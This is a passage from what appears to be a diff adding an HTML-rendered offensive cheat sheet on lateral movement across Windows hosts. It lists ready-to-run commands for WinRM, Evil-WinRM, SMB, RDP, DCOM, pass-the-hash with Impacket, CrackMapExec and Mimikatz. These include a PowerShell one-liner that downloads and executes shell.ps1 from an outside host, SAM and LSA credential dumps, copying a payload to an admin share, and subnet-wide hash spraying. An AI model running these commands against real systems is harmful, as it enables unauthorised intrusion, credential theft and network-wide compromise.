+</span><span id="__span-7-17"><a id="__codelineno-7-17" name="__codelineno-7-17" href="#__codelineno-7-17"></a><span class="c"># Multiple targets</span>
+</span><span id="__span-7-18"><a id="__codelineno-7-18" name="__codelineno-7-18" href="#__codelineno-7-18"></a><span class="nb">Invoke-Command</span> <span class="n">-ComputerName</span> <span class="n">TARGET1</span><span class="p">,</span><span class="n">TARGET2</span><span class="p">,</span><span class="n">TARGET3</span> <span class="n">-Credential</span> <span class="nv">$cred</span> <span class="n">-ScriptBlock</span> <span class="p">{</span> <span class="n">hostname</span> <span class="p">}</span>
+</span></code></pre></div></p>
+<p><strong>One-Liners:</strong>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a><span class="c"># Quick command execution</span>
+</span><span id="__span-8-2"><a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a><span class="nv">$pass</span> <span class="p">=</span> <span class="nb">ConvertTo-SecureString</span> <span class="s1">&#39;P@ssw0rd&#39;</span> <span class="n">-AsPlainText</span> <span class="n">-Force</span><span class="p">;</span> <span class="nv">$cred</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">PSCredential</span><span class="p">(</span><span class="s1">&#39;CORP\admin&#39;</span><span class="p">,</span> <span class="nv">$pass</span><span class="p">);</span> <span class="nb">Invoke-Command</span> <span class="n">-ComputerName</span> <span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">1</span><span class="p">.</span><span class="n">100</span> <span class="n">-Credential</span> <span class="nv">$cred</span> <span class="n">-ScriptBlock</span> <span class="p">{</span> <span class="n">whoami</span> <span class="p">}</span>
+</span><span id="__span-8-3"><a id="__codelineno-8-3" name="__codelineno-8-3" href="#__codelineno-8-3"></a>
+</span><span id="__span-8-4"><a id="__codelineno-8-4" name="__codelineno-8-4" href="#__codelineno-8-4"></a><span class="c"># Download and execute</span>
+</span><span id="__span-8-5"><a id="__codelineno-8-5" name="__codelineno-8-5" href="#__codelineno-8-5"></a><span class="nv">$pass</span> <span class="p">=</span> <span class="nb">ConvertTo-SecureString</span> <span class="s1">&#39;P@ssw0rd&#39;</span> <span class="n">-AsPlainText</span> <span class="n">-Force</span><span class="p">;</span> <span class="nv">$cred</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">PSCredential</span><span class="p">(</span><span class="s1">&#39;CORP\admin&#39;</span><span class="p">,</span> <span class="nv">$pass</span><span class="p">);</span> <span class="nb">Invoke-Command</span> <span class="n">-ComputerName</span> <span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">1</span><span class="p">.</span><span class="n">100</span> <span class="n">-Credential</span> <span class="nv">$cred</span> <span class="n">-ScriptBlock</span> <span class="p">{</span> <span class="n">IEX</span><span class="p">(</span><span class="nb">New-Object</span> <span class="n">Net</span><span class="p">.</span><span class="n">WebClient</span><span class="p">).</span><span class="n">DownloadString</span><span class="p">(</span><span class="s1">&#39;http://10.10.14.5/shell.ps1&#39;</span><span class="p">)</span> <span class="p">}</span>
+</span></code></pre></div></p>
+<h3 id="using-evil-winrm">Using Evil-WinRM</h3>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a><span class="c1"># With password</span>
+</span><span id="__span-9-2"><a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a>evil-winrm<span class="w"> </span>-i<span class="w"> </span>TARGET<span class="w"> </span>-u<span class="w"> </span>username<span class="w"> </span>-p<span class="w"> </span>password
+</span><span id="__span-9-3"><a id="__codelineno-9-3" name="__codelineno-9-3" href="#__codelineno-9-3"></a>evil-winrm<span class="w"> </span>-i<span class="w"> </span><span class="m">192</span>.168.1.100<span class="w"> </span>-u<span class="w"> </span>Administrator<span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;P@ssw0rd&#39;</span>
+</span><span id="__span-9-4"><a id="__codelineno-9-4" name="__codelineno-9-4" href="#__codelineno-9-4"></a>
+</span><span id="__span-9-5"><a id="__codelineno-9-5" name="__codelineno-9-5" href="#__codelineno-9-5"></a><span class="c1"># With NTLM hash</span>
+</span><span id="__span-9-6"><a id="__codelineno-9-6" name="__codelineno-9-6" href="#__codelineno-9-6"></a>evil-winrm<span class="w"> </span>-i<span class="w"> </span>TARGET<span class="w"> </span>-u<span class="w"> </span>username<span class="w"> </span>-H<span class="w"> </span>NTLM_HASH
+</span><span id="__span-9-7"><a id="__codelineno-9-7" name="__codelineno-9-7" href="#__codelineno-9-7"></a>evil-winrm<span class="w"> </span>-i<span class="w"> </span><span class="m">192</span>.168.1.100<span class="w"> </span>-u<span class="w"> </span>Administrator<span class="w"> </span>-H<span class="w"> </span>e19ccf75ee54e06b06a5907af13cef42
+</span><span id="__span-9-8"><a id="__codelineno-9-8" name="__codelineno-9-8" href="#__codelineno-9-8"></a>
+</span><span id="__span-9-9"><a id="__codelineno-9-9" name="__codelineno-9-9" href="#__codelineno-9-9"></a><span class="c1"># With SSL</span>
+</span><span id="__span-9-10"><a id="__codelineno-9-10" name="__codelineno-9-10" href="#__codelineno-9-10"></a>evil-winrm<span class="w"> </span>-i<span class="w"> </span>TARGET<span class="w"> </span>-u<span class="w"> </span>username<span class="w"> </span>-p<span class="w"> </span>password<span class="w"> </span>-S
+</span><span id="__span-9-11"><a id="__codelineno-9-11" name="__codelineno-9-11" href="#__codelineno-9-11"></a>
+</span><span id="__span-9-12"><a id="__codelineno-9-12" name="__codelineno-9-12" href="#__codelineno-9-12"></a><span class="c1"># Upload file</span>
+</span><span id="__span-9-13"><a id="__codelineno-9-13" name="__codelineno-9-13" href="#__codelineno-9-13"></a>evil-winrm<span class="w"> </span>-i<span class="w"> </span>TARGET<span class="w"> </span>-u<span class="w"> </span>username<span class="w"> </span>-p<span class="w"> </span>password<span class="w"> </span>-e<span class="w"> </span>/path/to/file
+</span><span id="__span-9-14"><a id="__codelineno-9-14" name="__codelineno-9-14" href="#__codelineno-9-14"></a>
+</span><span id="__span-9-15"><a id="__codelineno-9-15" name="__codelineno-9-15" href="#__codelineno-9-15"></a><span class="c1"># Execute script</span>
+</span><span id="__span-9-16"><a id="__codelineno-9-16" name="__codelineno-9-16" href="#__codelineno-9-16"></a>evil-winrm<span class="w"> </span>-i<span class="w"> </span>TARGET<span class="w"> </span>-u<span class="w"> </span>username<span class="w"> </span>-p<span class="w"> </span>password<span class="w"> </span>-s<span class="w"> </span>script.ps1
+</span></code></pre></div>
+<hr />
+<h2 id="smb-server-message-block">SMB (Server Message Block)</h2>
+<h3 id="using-smbclient">Using smbclient</h3>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a><span class="c1"># List shares</span>
+</span><span id="__span-10-2"><a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a>smbclient<span class="w"> </span>-L<span class="w"> </span>//TARGET<span class="w"> </span>-U<span class="w"> </span>DOMAIN<span class="se">\u</span>sername
+</span><span id="__span-10-3"><a id="__codelineno-10-3" name="__codelineno-10-3" href="#__codelineno-10-3"></a>smbclient<span class="w"> </span>-L<span class="w"> </span>//192.168.1.100<span class="w"> </span>-U<span class="w"> </span>CORP<span class="se">\a</span>dmin
+</span><span id="__span-10-4"><a id="__codelineno-10-4" name="__codelineno-10-4" href="#__codelineno-10-4"></a>
+</span><span id="__span-10-5"><a id="__codelineno-10-5" name="__codelineno-10-5" href="#__codelineno-10-5"></a><span class="c1"># Connect to share</span>
+</span><span id="__span-10-6"><a id="__codelineno-10-6" name="__codelineno-10-6" href="#__codelineno-10-6"></a>smbclient<span class="w"> </span>//TARGET/SHARE<span class="w"> </span>-U<span class="w"> </span>DOMAIN<span class="se">\u</span>sername
+</span><span id="__span-10-7"><a id="__codelineno-10-7" name="__codelineno-10-7" href="#__codelineno-10-7"></a>smbclient<span class="w"> </span>//192.168.1.100/C$<span class="w"> </span>-U<span class="w"> </span>CORP<span class="se">\A</span>dministrator
+</span><span id="__span-10-8"><a id="__codelineno-10-8" name="__codelineno-10-8" href="#__codelineno-10-8"></a>
+</span><span id="__span-10-9"><a id="__codelineno-10-9" name="__codelineno-10-9" href="#__codelineno-10-9"></a><span class="c1"># With password</span>
+</span><span id="__span-10-10"><a id="__codelineno-10-10" name="__codelineno-10-10" href="#__codelineno-10-10"></a>smbclient<span class="w"> </span>//TARGET/C$<span class="w"> </span>-U<span class="w"> </span>DOMAIN<span class="se">\u</span>sername%password
+</span><span id="__span-10-11"><a id="__codelineno-10-11" name="__codelineno-10-11" href="#__codelineno-10-11"></a>
+</span><span id="__span-10-12"><a id="__codelineno-10-12" name="__codelineno-10-12" href="#__codelineno-10-12"></a><span class="c1"># With hash (pass-the-hash)</span>
+</span><span id="__span-10-13"><a id="__codelineno-10-13" name="__codelineno-10-13" href="#__codelineno-10-13"></a>smbclient<span class="w"> </span>//TARGET/C$<span class="w"> </span>--pw-nt-hash<span class="w"> </span>-U<span class="w"> </span>DOMAIN<span class="se">\u</span>sername%NTLM_HASH
+</span><span id="__span-10-14"><a id="__codelineno-10-14" name="__codelineno-10-14" href="#__codelineno-10-14"></a>
+</span><span id="__span-10-15"><a id="__codelineno-10-15" name="__codelineno-10-15" href="#__codelineno-10-15"></a><span class="c1"># Execute command</span>
+</span><span id="__span-10-16"><a id="__codelineno-10-16" name="__codelineno-10-16" href="#__codelineno-10-16"></a>smbclient<span class="w"> </span>//TARGET/C$<span class="w"> </span>-U<span class="w"> </span>username<span class="w"> </span>-c<span class="w"> </span><span class="s1">&#39;ls&#39;</span>
+</span></code></pre></div>
+<h3 id="using-impacket-smbexec">Using Impacket SMBExec</h3>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a><span class="c1"># With password</span>
+</span><span id="__span-11-2"><a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a>impacket-smbexec<span class="w"> </span>DOMAIN/username:password@TARGET
+</span><span id="__span-11-3"><a id="__codelineno-11-3" name="__codelineno-11-3" href="#__codelineno-11-3"></a>impacket-smbexec<span class="w"> </span>CORP/Administrator:P@ssw0rd@192.168.1.100
+</span><span id="__span-11-4"><a id="__codelineno-11-4" name="__codelineno-11-4" href="#__codelineno-11-4"></a>
+</span><span id="__span-11-5"><a id="__codelineno-11-5" name="__codelineno-11-5" href="#__codelineno-11-5"></a><span class="c1"># With NTLM hash</span>
+</span><span id="__span-11-6"><a id="__codelineno-11-6" name="__codelineno-11-6" href="#__codelineno-11-6"></a>impacket-smbexec<span class="w"> </span>-hashes<span class="w"> </span>:NTLM_HASH<span class="w"> </span>DOMAIN/username@TARGET
+</span><span id="__span-11-7"><a id="__codelineno-11-7" name="__codelineno-11-7" href="#__codelineno-11-7"></a>impacket-smbexec<span class="w"> </span>-hashes<span class="w"> </span>:e19ccf75ee54e06b06a5907af13cef42<span class="w"> </span>CORP/admin@192.168.1.100
+</span></code></pre></div>
+<h3 id="mounting-smb-shares">Mounting SMB Shares</h3>
+<p><strong>Windows:</strong>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a># Map network drive
+</span><span id="__span-12-2"><a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a>net use Z: \\TARGET\C$ /user:DOMAIN\username password
+</span><span id="__span-12-3"><a id="__codelineno-12-3" name="__codelineno-12-3" href="#__codelineno-12-3"></a>
+</span><span id="__span-12-4"><a id="__codelineno-12-4" name="__codelineno-12-4" href="#__codelineno-12-4"></a># Access without mapping
+</span><span id="__span-12-5"><a id="__codelineno-12-5" name="__codelineno-12-5" href="#__codelineno-12-5"></a>dir \\TARGET\C$
+</span><span id="__span-12-6"><a id="__codelineno-12-6" name="__codelineno-12-6" href="#__codelineno-12-6"></a>copy payload.exe \\TARGET\C$\temp\
+</span><span id="__span-12-7"><a id="__codelineno-12-7" name="__codelineno-12-7" href="#__codelineno-12-7"></a>
+</span><span id="__span-12-8"><a id="__codelineno-12-8" name="__codelineno-12-8" href="#__codelineno-12-8"></a># Unmount
+</span><span id="__span-12-9"><a id="__codelineno-12-9" name="__codelineno-12-9" href="#__codelineno-12-9"></a>net use Z: /delete
+</span></code></pre></div></p>
+<p><strong>Linux:</strong>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a><span class="c1"># Mount SMB share</span>
+</span><span id="__span-13-2"><a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a>mount<span class="w"> </span>-t<span class="w"> </span>cifs<span class="w"> </span>//TARGET/C$<span class="w"> </span>/mnt/share<span class="w"> </span>-o<span class="w"> </span><span class="nv">username</span><span class="o">=</span>user,password<span class="o">=</span>pass,domain<span class="o">=</span>DOMAIN
+</span><span id="__span-13-3"><a id="__codelineno-13-3" name="__codelineno-13-3" href="#__codelineno-13-3"></a>
+</span><span id="__span-13-4"><a id="__codelineno-13-4" name="__codelineno-13-4" href="#__codelineno-13-4"></a><span class="c1"># With credentials file</span>
+</span><span id="__span-13-5"><a id="__codelineno-13-5" name="__codelineno-13-5" href="#__codelineno-13-5"></a>mount<span class="w"> </span>-t<span class="w"> </span>cifs<span class="w"> </span>//TARGET/C$<span class="w"> </span>/mnt/share<span class="w"> </span>-o<span class="w"> </span><span class="nv">credentials</span><span class="o">=</span>/path/to/creds.txt
+</span><span id="__span-13-6"><a id="__codelineno-13-6" name="__codelineno-13-6" href="#__codelineno-13-6"></a>
+</span><span id="__span-13-7"><a id="__codelineno-13-7" name="__codelineno-13-7" href="#__codelineno-13-7"></a><span class="c1"># Unmount</span>
+</span><span id="__span-13-8"><a id="__codelineno-13-8" name="__codelineno-13-8" href="#__codelineno-13-8"></a>umount<span class="w"> </span>/mnt/share
+</span></code></pre></div></p>
+<hr />
+<h2 id="rdp-remote-desktop-protocol">RDP (Remote Desktop Protocol)</h2>
+<h3 id="using-xfreerdp">Using xfreerdp</h3>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a><span class="c1"># Basic connection</span>
+</span><span id="__span-14-2"><a id="__codelineno-14-2" name="__codelineno-14-2" href="#__codelineno-14-2"></a>xfreerdp<span class="w"> </span>/v:TARGET<span class="w"> </span>/u:DOMAIN<span class="se">\u</span>sername<span class="w"> </span>/p:password
+</span><span id="__span-14-3"><a id="__codelineno-14-3" name="__codelineno-14-3" href="#__codelineno-14-3"></a>xfreerdp<span class="w"> </span>/v:192.168.1.100<span class="w"> </span>/u:CORP<span class="se">\A</span>dministrator<span class="w"> </span>/p:<span class="s1">&#39;P@ssw0rd&#39;</span>
+</span><span id="__span-14-4"><a id="__codelineno-14-4" name="__codelineno-14-4" href="#__codelineno-14-4"></a>
+</span><span id="__span-14-5"><a id="__codelineno-14-5" name="__codelineno-14-5" href="#__codelineno-14-5"></a><span class="c1"># With hash (Restricted Admin mode required)</span>
+</span><span id="__span-14-6"><a id="__codelineno-14-6" name="__codelineno-14-6" href="#__codelineno-14-6"></a>xfreerdp<span class="w"> </span>/v:TARGET<span class="w"> </span>/u:username<span class="w"> </span>/pth:NTLM_HASH
+</span><span id="__span-14-7"><a id="__codelineno-14-7" name="__codelineno-14-7" href="#__codelineno-14-7"></a>
+</span><span id="__span-14-8"><a id="__codelineno-14-8" name="__codelineno-14-8" href="#__codelineno-14-8"></a><span class="c1"># Full screen</span>
+</span><span id="__span-14-9"><a id="__codelineno-14-9" name="__codelineno-14-9" href="#__codelineno-14-9"></a>xfreerdp<span class="w"> </span>/v:TARGET<span class="w"> </span>/u:username<span class="w"> </span>/p:password<span class="w"> </span>/f
+</span><span id="__span-14-10"><a id="__codelineno-14-10" name="__codelineno-14-10" href="#__codelineno-14-10"></a>
+</span><span id="__span-14-11"><a id="__codelineno-14-11" name="__codelineno-14-11" href="#__codelineno-14-11"></a><span class="c1"># Specific resolution</span>
+</span><span id="__span-14-12"><a id="__codelineno-14-12" name="__codelineno-14-12" href="#__codelineno-14-12"></a>xfreerdp<span class="w"> </span>/v:TARGET<span class="w"> </span>/u:username<span class="w"> </span>/p:password<span class="w"> </span>/w:1920<span class="w"> </span>/h:1080
+</span><span id="__span-14-13"><a id="__codelineno-14-13" name="__codelineno-14-13" href="#__codelineno-14-13"></a>
+</span><span id="__span-14-14"><a id="__codelineno-14-14" name="__codelineno-14-14" href="#__codelineno-14-14"></a><span class="c1"># Share local drive</span>
+</span><span id="__span-14-15"><a id="__codelineno-14-15" name="__codelineno-14-15" href="#__codelineno-14-15"></a>xfreerdp<span class="w"> </span>/v:TARGET<span class="w"> </span>/u:username<span class="w"> </span>/p:password<span class="w"> </span>/drive:share,/tmp
+</span><span id="__span-14-16"><a id="__codelineno-14-16" name="__codelineno-14-16" href="#__codelineno-14-16"></a>
+</span><span id="__span-14-17"><a id="__codelineno-14-17" name="__codelineno-14-17" href="#__codelineno-14-17"></a><span class="c1"># Enable clipboard</span>
+</span><span id="__span-14-18"><a id="__codelineno-14-18" name="__codelineno-14-18" href="#__codelineno-14-18"></a>xfreerdp<span class="w"> </span>/v:TARGET<span class="w"> </span>/u:username<span class="w"> </span>/p:password<span class="w"> </span>+clipboard
+</span><span id="__span-14-19"><a id="__codelineno-14-19" name="__codelineno-14-19" href="#__codelineno-14-19"></a>
+</span><span id="__span-14-20"><a id="__codelineno-14-20" name="__codelineno-14-20" href="#__codelineno-14-20"></a><span class="c1"># Disable TLS security</span>
+</span><span id="__span-14-21"><a id="__codelineno-14-21" name="__codelineno-14-21" href="#__codelineno-14-21"></a>xfreerdp<span class="w"> </span>/v:TARGET<span class="w"> </span>/u:username<span class="w"> </span>/p:password<span class="w"> </span>/sec:rdp
+</span></code></pre></div>
+<h3 id="using-rdesktop">Using rdesktop</h3>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a><span class="c1"># Basic connection</span>
+</span><span id="__span-15-2"><a id="__codelineno-15-2" name="__codelineno-15-2" href="#__codelineno-15-2"></a>rdesktop<span class="w"> </span>TARGET<span class="w"> </span>-u<span class="w"> </span>DOMAIN<span class="se">\u</span>sername<span class="w"> </span>-p<span class="w"> </span>password
+</span><span id="__span-15-3"><a id="__codelineno-15-3" name="__codelineno-15-3" href="#__codelineno-15-3"></a>rdesktop<span class="w"> </span><span class="m">192</span>.168.1.100<span class="w"> </span>-u<span class="w"> </span>CORP<span class="se">\a</span>dmin<span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;P@ssw0rd&#39;</span>
+</span><span id="__span-15-4"><a id="__codelineno-15-4" name="__codelineno-15-4" href="#__codelineno-15-4"></a>
+</span><span id="__span-15-5"><a id="__codelineno-15-5" name="__codelineno-15-5" href="#__codelineno-15-5"></a><span class="c1"># Full screen</span>
+</span><span id="__span-15-6"><a id="__codelineno-15-6" name="__codelineno-15-6" href="#__codelineno-15-6"></a>rdesktop<span class="w"> </span>TARGET<span class="w"> </span>-u<span class="w"> </span>username<span class="w"> </span>-p<span class="w"> </span>password<span class="w"> </span>-f
+</span><span id="__span-15-7"><a id="__codelineno-15-7" name="__codelineno-15-7" href="#__codelineno-15-7"></a>
+</span><span id="__span-15-8"><a id="__codelineno-15-8" name="__codelineno-15-8" href="#__codelineno-15-8"></a><span class="c1"># Specific resolution</span>
+</span><span id="__span-15-9"><a id="__codelineno-15-9" name="__codelineno-15-9" href="#__codelineno-15-9"></a>rdesktop<span class="w"> </span>TARGET<span class="w"> </span>-u<span class="w"> </span>username<span class="w"> </span>-p<span class="w"> </span>password<span class="w"> </span>-g<span class="w"> </span>1920x1080
+</span></code></pre></div>
+<hr />
+<h2 id="pass-the-hash-pth">Pass-the-Hash (PTH)</h2>
+<h3 id="using-impacket-tools">Using Impacket Tools</h3>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-16-1"><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a><span class="c1"># PsExec with hash</span>
+</span><span id="__span-16-2"><a id="__codelineno-16-2" name="__codelineno-16-2" href="#__codelineno-16-2"></a>impacket-psexec<span class="w"> </span>-hashes<span class="w"> </span>:NTLM_HASH<span class="w"> </span>DOMAIN/username@TARGET
+</span><span id="__span-16-3"><a id="__codelineno-16-3" name="__codelineno-16-3" href="#__codelineno-16-3"></a>
+</span><span id="__span-16-4"><a id="__codelineno-16-4" name="__codelineno-16-4" href="#__codelineno-16-4"></a><span class="c1"># WMIExec with hash</span>
+</span><span id="__span-16-5"><a id="__codelineno-16-5" name="__codelineno-16-5" href="#__codelineno-16-5"></a>impacket-wmiexec<span class="w"> </span>-hashes<span class="w"> </span>:NTLM_HASH<span class="w"> </span>DOMAIN/username@TARGET
+</span><span id="__span-16-6"><a id="__codelineno-16-6" name="__codelineno-16-6" href="#__codelineno-16-6"></a>
+</span><span id="__span-16-7"><a id="__codelineno-16-7" name="__codelineno-16-7" href="#__codelineno-16-7"></a><span class="c1"># SMBExec with hash</span>
+</span><span id="__span-16-8"><a id="__codelineno-16-8" name="__codelineno-16-8" href="#__codelineno-16-8"></a>impacket-smbexec<span class="w"> </span>-hashes<span class="w"> </span>:NTLM_HASH<span class="w"> </span>DOMAIN/username@TARGET
+</span><span id="__span-16-9"><a id="__codelineno-16-9" name="__codelineno-16-9" href="#__codelineno-16-9"></a>
+</span><span id="__span-16-10"><a id="__codelineno-16-10" name="__codelineno-16-10" href="#__codelineno-16-10"></a><span class="c1"># AtExec with hash</span>
+</span><span id="__span-16-11"><a id="__codelineno-16-11" name="__codelineno-16-11" href="#__codelineno-16-11"></a>impacket-atexec<span class="w"> </span>-hashes<span class="w"> </span>:NTLM_HASH<span class="w"> </span>DOMAIN/username@TARGET<span class="w"> </span><span class="s1">&#39;whoami&#39;</span>
+</span><span id="__span-16-12"><a id="__codelineno-16-12" name="__codelineno-16-12" href="#__codelineno-16-12"></a>
+</span><span id="__span-16-13"><a id="__codelineno-16-13" name="__codelineno-16-13" href="#__codelineno-16-13"></a><span class="c1"># DcomExec with hash</span>
+</span><span id="__span-16-14"><a id="__codelineno-16-14" name="__codelineno-16-14" href="#__codelineno-16-14"></a>impacket-dcomexec<span class="w"> </span>-hashes<span class="w"> </span>:NTLM_HASH<span class="w"> </span>DOMAIN/username@TARGET
+</span></code></pre></div>
+<h3 id="using-crackmapexec">Using CrackMapExec</h3>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-17-1"><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a><span class="c1"># Execute command with hash</span>
+</span><span id="__span-17-2"><a id="__codelineno-17-2" name="__codelineno-17-2" href="#__codelineno-17-2"></a>crackmapexec<span class="w"> </span>smb<span class="w"> </span>TARGET<span class="w"> </span>-u<span class="w"> </span>username<span class="w"> </span>-H<span class="w"> </span>NTLM_HASH<span class="w"> </span>-x<span class="w"> </span><span class="s2">&quot;whoami&quot;</span>
+</span><span id="__span-17-3"><a id="__codelineno-17-3" name="__codelineno-17-3" href="#__codelineno-17-3"></a>crackmapexec<span class="w"> </span>smb<span class="w"> </span><span class="m">192</span>.168.1.100<span class="w"> </span>-u<span class="w"> </span>Administrator<span class="w"> </span>-H<span class="w"> </span>e19ccf75ee54e06b06a5907af13cef42<span class="w"> </span>-x<span class="w"> </span><span class="s2">&quot;ipconfig&quot;</span>
+</span><span id="__span-17-4"><a id="__codelineno-17-4" name="__codelineno-17-4" href="#__codelineno-17-4"></a>
+</span><span id="__span-17-5"><a id="__codelineno-17-5" name="__codelineno-17-5" href="#__codelineno-17-5"></a><span class="c1"># Execute PowerShell</span>
+</span><span id="__span-17-6"><a id="__codelineno-17-6" name="__codelineno-17-6" href="#__codelineno-17-6"></a>crackmapexec<span class="w"> </span>smb<span class="w"> </span>TARGET<span class="w"> </span>-u<span class="w"> </span>username<span class="w"> </span>-H<span class="w"> </span>NTLM_HASH<span class="w"> </span>-X<span class="w"> </span><span class="s1">&#39;$PSVersionTable&#39;</span>
+</span><span id="__span-17-7"><a id="__codelineno-17-7" name="__codelineno-17-7" href="#__codelineno-17-7"></a>
+</span><span id="__span-17-8"><a id="__codelineno-17-8" name="__codelineno-17-8" href="#__codelineno-17-8"></a><span class="c1"># Dump SAM</span>
+</span><span id="__span-17-9"><a id="__codelineno-17-9" name="__codelineno-17-9" href="#__codelineno-17-9"></a>crackmapexec<span class="w"> </span>smb<span class="w"> </span>TARGET<span class="w"> </span>-u<span class="w"> </span>username<span class="w"> </span>-H<span class="w"> </span>NTLM_HASH<span class="w"> </span>--sam
+</span><span id="__span-17-10"><a id="__codelineno-17-10" name="__codelineno-17-10" href="#__codelineno-17-10"></a>
+</span><span id="__span-17-11"><a id="__codelineno-17-11" name="__codelineno-17-11" href="#__codelineno-17-11"></a><span class="c1"># Dump LSA</span>
+</span><span id="__span-17-12"><a id="__codelineno-17-12" name="__codelineno-17-12" href="#__codelineno-17-12"></a>crackmapexec<span class="w"> </span>smb<span class="w"> </span>TARGET<span class="w"> </span>-u<span class="w"> </span>username<span class="w"> </span>-H<span class="w"> </span>NTLM_HASH<span class="w"> </span>--lsa
+</span><span id="__span-17-13"><a id="__codelineno-17-13" name="__codelineno-17-13" href="#__codelineno-17-13"></a>
+</span><span id="__span-17-14"><a id="__codelineno-17-14" name="__codelineno-17-14" href="#__codelineno-17-14"></a><span class="c1"># Multiple targets</span>
+</span><span id="__span-17-15"><a id="__codelineno-17-15" name="__codelineno-17-15" href="#__codelineno-17-15"></a>crackmapexec<span class="w"> </span>smb<span class="w"> </span><span class="m">192</span>.168.1.0/24<span class="w"> </span>-u<span class="w"> </span>Administrator<span class="w"> </span>-H<span class="w"> </span>NTLM_HASH<span class="w"> </span>-x<span class="w"> </span><span class="s2">&quot;whoami&quot;</span>
+</span></code></pre></div>
+<h3 id="using-mimikatz-pth">Using Mimikatz PTH</h3>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-18-1"><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a><span class="c"># Pass-the-Hash to spawn cmd</span>
+</span><span id="__span-18-2"><a id="__codelineno-18-2" name="__codelineno-18-2" href="#__codelineno-18-2"></a><span class="n">mimikatz</span><span class="p">.</span><span class="n">exe</span> <span class="s2">&quot;privilege::debug&quot;</span> <span class="s2">&quot;sekurlsa::pth /user:Administrator /domain:CORP /ntlm:e19ccf75ee54e06b06a5907af13cef42 /run:cmd.exe&quot;</span> <span class="s2">&quot;exit&quot;</span>
+</span><span id="__span-18-3"><a id="__codelineno-18-3" name="__codelineno-18-3" href="#__codelineno-18-3"></a>
+</span><span id="__span-18-4"><a id="__codelineno-18-4" name="__codelineno-18-4" href="#__codelineno-18-4"></a><span class="c"># From new cmd, access remote system</span>
+</span><span id="__span-18-5"><a id="__codelineno-18-5" name="__codelineno-18-5" href="#__codelineno-18-5"></a><span class="nb">dir </span><span class="p">\\</span><span class="n">TARGET</span><span class="p">\</span><span class="n">C</span><span class="p">$</span>
+</span><span id="__span-18-6"><a id="__codelineno-18-6" name="__codelineno-18-6" href="#__codelineno-18-6"></a><span class="n">psexec</span><span class="p">.</span><span class="n">exe</span> <span class="p">\\</span><span class="n">TARGET</span> <span class="n">cmd</span><span class="p">.</span><span class="n">exe</span>
+</span></code></pre></div>
+<hr />
+<h2 id="dcom-distributed-component-object-model">DCOM (Distributed Component Object Model)</h2>
+<h3 id="using-impacket-dcomexec">Using Impacket DcomExec</h3>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-19-1"><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a><span class="c1"># With password</span>
+</span><span id="__span-19-2"><a id="__codelineno-19-2" name="__codelineno-19-2" href="#__codelineno-19-2"></a>impacket-dcomexec<span class="w"> </span>DOMAIN/username:password@TARGET
+</span><span id="__span-19-3"><a id="__codelineno-19-3" name="__codelineno-19-3" href="#__codelineno-19-3"></a>impacket-dcomexec<span class="w"> </span>CORP/Administrator:P@ssw0rd@192.168.1.100
+</span><span id="__span-19-4"><a id="__codelineno-19-4" name="__codelineno-19-4" href="#__codelineno-19-4"></a>
+</span><span id="__span-19-5"><a id="__codelineno-19-5" name="__codelineno-19-5" href="#__codelineno-19-5"></a><span class="c1"># With hash</span>
+</span><span id="__span-19-6"><a id="__codelineno-19-6" name="__codelineno-19-6" href="#__codelineno-19-6"></a>impacket-dcomexec<span class="w"> </span>-hashes<span class="w"> </span>:NTLM_HASH<span class="w"> </span>DOMAIN/username@TARGET
+</span><span id="__span-19-7"><a id="__codelineno-19-7" name="__codelineno-19-7" href="#__codelineno-19-7"></a>impacket-dcomexec<span class="w"> </span>-hashes<span class="w"> </span>:e19ccf75ee54e06b06a5907af13cef42<span class="w"> </span>CORP/admin@192.168.1.100
+</span><span id="__span-19-8"><a id="__codelineno-19-8" name="__codelineno-19-8" href="#__codelineno-19-8"></a>
+</span><span id="__span-19-9"><a id="__codelineno-19-9" name="__codelineno-19-9" href="#__codelineno-19-9"></a><span class="c1"># Execute command</span>
+</span><span id="__span-19-10"><a id="__codelineno-19-10" name="__codelineno-19-10" href="#__codelineno-19-10"></a>impacket-dcomexec<span class="w"> </span>DOMAIN/username:password@TARGET<span class="w"> </span><span class="s1">&#39;ipconfig&#39;</span>
+</span></code></pre></div>
+<h3 id="using-powershell-dcom">Using PowerShell DCOM</h3>
